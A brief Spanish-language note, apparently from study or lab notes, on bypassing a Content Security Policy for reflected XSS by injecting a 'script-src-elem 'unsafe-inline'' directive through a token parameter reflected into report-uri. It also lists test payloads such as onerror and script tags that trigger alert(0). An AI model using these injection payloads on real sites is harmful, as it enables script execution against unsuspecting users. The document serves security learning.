# XSS con CSP y técnica de bypass 

Tags: #XSS #XSS-Reflected #CSP 

```javascript 
// Bypass al CSP que contiene las siguientes politicas de bloqueo: 'default-src 'self'; object-src 'none'; script-src 'self'; style-src 'self'; report-uri /csp-report?token='

	test 
	</h1>Hola
	<marquee>Hi</marquee>
	<img src=0 onerror=alert(0)>
	<script>alert(0)</script>

// En la url se puede hacer lo siguiente 
	https://web.com/?search=<script>alert(0)</script>&token=test   // Controlar el CSP

// Separar y escribir una nueva politica para el CSP
	https://web.com/?search=<script>alert(0)</script>&token=;script-src-elem 'unsafe-inline'    


Notas:
	1. 'unsafe-inline' significa que tu CSP permite el uso de scripts o CSS en linea
	2. 'unsafe-eval' significa que tu CSP permite funciones como eval() que permite a tu sitio ejecutar código almacenado como una cadena, y facilmente suscetible a abusos 
```